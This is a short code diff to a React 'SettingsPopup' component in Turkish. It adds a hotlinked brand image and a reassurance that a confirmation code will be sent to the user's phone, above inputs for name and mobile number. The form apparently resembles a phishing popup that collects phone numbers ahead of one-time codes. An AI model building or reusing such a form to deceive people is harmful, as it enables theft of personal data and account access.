@@ -221,9 +221,9 @@ function SettingsPopup() {
             <h1>KAZANA</h1>
             <h1>HOŞGELDİNİZ</h1>
             </div>
-           
+            <img src="
+            https://imgvisilabsnet.azureedge.net/banner/uploaded_images/305_1365_20220629234933801.png" style="height:18px;margin-left:-432px;margin-bottom:-3px;width:20px;"> <p style="margin-bottom:-45px;height:44px;margin:-25px; color:#000000">Güvenliginiz için cep telefonunuza onay kodu gönderilecektir.</p><br/>
             <div class="pop-input">
-  
             <input type="text" name="ad" id="ad" required placeholder="Ad Soyad">
   
             <input type="text" name="tel" id="telefon" required placeholder="Cep Telefonu">
